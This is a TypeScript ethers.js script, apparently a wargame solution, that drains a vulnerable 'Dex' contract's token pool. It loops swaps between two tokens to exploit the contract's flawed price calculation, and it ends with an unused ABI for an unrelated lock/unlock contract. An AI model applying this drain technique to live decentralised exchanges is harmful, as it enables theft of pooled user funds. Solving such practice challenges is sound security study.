// Runtime Environment's members available in the global scope.
import { ethers } from 'ethers';
import { BigNumber, Signer, BytesLike } from "ethers";
import { getSigner } from "./signer";
import { Dex__factory } from "../typechain";

async function main() {
  const instanceAddress = "0x86E3321F4f22D50517e10C369c54F312225B6c0b";
  const signer = getSigner();

  const dex = await (new Dex__factory(signer)).attach(instanceAddress);
  console.log("allow dex to transfer my money");
  await (await dex.approve(dex.address, ethers.constants.MaxUint256)).wait();

  const playerAddress = await signer.getAddress();
  const token1 = await dex.token1();
  const token2 = await dex.token2();
  console.log("swapping");

  const playerToken1Balance = async () => await dex.balanceOf(token1, playerAddress);
  const playerToken2Balance = async () => await dex.balanceOf(token2, playerAddress);
  const liquid1Balance = async () => await dex.balanceOf(token1, dex.address);
  const liquid2Balance = async () => await dex.balanceOf(token2, dex.address);

  while (true) {

    const liquid1 = await liquid1Balance();
    const liquid2 = await liquid2Balance();
    const t1b = await playerToken1Balance();
    const t2b = await playerToken2Balance();
    console.log("liquid1: ", liquid1.toString());
    console.log("liquid2: ", liquid2.toString());
    console.log("balance of token1: ", t1b.toString());
    console.log("balance of token2: ", t2b.toString());
    if (liquid1.isZero())
      break;
    else if (liquid2.isZero())
      break;

    if (t2b.gt(0)) {

      console.log("swap 2 to 1")
      let swapPrice = await dex.get_swap_price(token2, token1, t2b);
      const maxSwap = liquid1.mul(t2b).div(swapPrice);
      const swapAmount = maxSwap.gt(swapPrice) ? t2b : maxSwap;
      await (await dex.swap(token2, token1, swapAmount, { gasLimit: 500000 })).wait();
    }
    else if (t1b.gt(0)) {
      console.log("swap 1 to 2")
      let swapPrice = await dex.get_swap_price(token1, token2, t1b);
      const maxSwap = liquid2.mul(t1b).div(swapPrice);
      const swapAmount = maxSwap.gt(swapPrice) ? t1b : maxSwap;
      await (await dex.swap(token1, token2, swapAmount, { gasLimit: 500000 })).wait();
    }
  }

}

main()
  .then(() => {
    console.log("Done!");
    process.exit(0);
  })
  .catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });

const abi = [
  {
    "inputs": [
      {
        "internalType": "bytes32[3]",
        "name": "_data",
        "type": "bytes32[3]"
      }
    ],
    "stateMutability": "nonpayable",
    "type": "constructor"
  },
  {
    "inputs": [],
    "name": "ID",
    "outputs": [
      {
        "internalType": "uint256",
        "name": "",
        "type": "uint256"
      }
    ],
    "stateMutability": "view",
    "type": "function",
    "constant": true,
    "signature": "0xb3cea217"
  },
  {
    "inputs": [],
    "name": "locked",
    "outputs": [
      {
        "internalType": "bool",
        "name": "",
        "type": "bool"
      }
    ],
    "stateMutability": "view",
    "type": "function",
    "constant": true,
    "signature": "0xcf309012"
  },
  {
    "inputs": [
      {
        "internalType": "bytes16",
        "name": "_key",
        "type": "bytes16"
      }
    ],
    "name": "unlock",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function",
    "signature": "0xe1afb08c"
  }
]